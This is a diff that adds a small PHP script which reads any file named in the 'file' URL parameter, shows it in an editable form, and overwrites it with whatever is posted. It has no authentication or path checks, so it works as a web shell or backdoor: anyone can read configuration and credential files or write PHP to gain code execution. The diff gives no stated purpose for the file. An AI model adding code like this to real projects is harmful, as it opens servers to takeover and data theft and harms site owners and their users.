@@ -1,0 +1,20 @@
+<?php
+if (isset($_GET['file'])) {
+    $file = $_GET['file'];
+
+    // Save updated content
+    if (isset($_POST['content'])) {
+        file_put_contents($file, $_POST['content']);
+        echo "<p><b>Saved!</b></p>";
+    }
+
+    // Display file content
+    $content = htmlspecialchars(file_get_contents($file));
+    echo "<form method='POST'>
+        <textarea name='content' style='width:100%;height:90vh;'>$content</textarea><br>
+        <input type='submit' value='Save'>
+    </form>";
+} else {
+    echo "Usage: ?file=filename.txt";
+}
+?>
